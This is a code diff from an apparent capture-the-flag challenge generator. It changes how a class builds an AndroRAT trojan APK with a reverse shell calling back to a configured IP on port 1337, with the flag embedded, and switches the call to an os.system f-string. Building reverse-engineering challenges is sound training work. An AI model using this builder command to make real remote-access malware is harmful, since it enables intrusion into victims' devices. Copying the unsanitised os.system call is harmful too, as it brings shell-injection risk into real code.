@@ -65,10 +65,14 @@ class ApkTrojanRE(GeneratedChallenge):
     """
 
     def gen(self, chal_dir):
-        cwd = "./chal_types/chal_files/AndroRAT"
         culprit_ip = self.get_value("culprit_ip")
-        subprocess.call(f"python3 androRAT.py --build --shell -i culprit:{culprit_ip},{self.flag} -p 1337 -o trojan.apk", cwd=cwd)
+        output_location = join(chal_dir, "trojan.apk")
+        with WorkDir("chal_types/chal_files/AndroRAT"):
+            os.system(
+                f"python3 androRAT.py --build --shell -i culprit:{culprit_ip},{self.flag} -p 1337 -o {output_location}"
+            )
         self.chal_file = "trojan.apk"
+
 
 class DocxMalware(GeneratedChallenge):
     yaml_tag = u'!docx_malware'
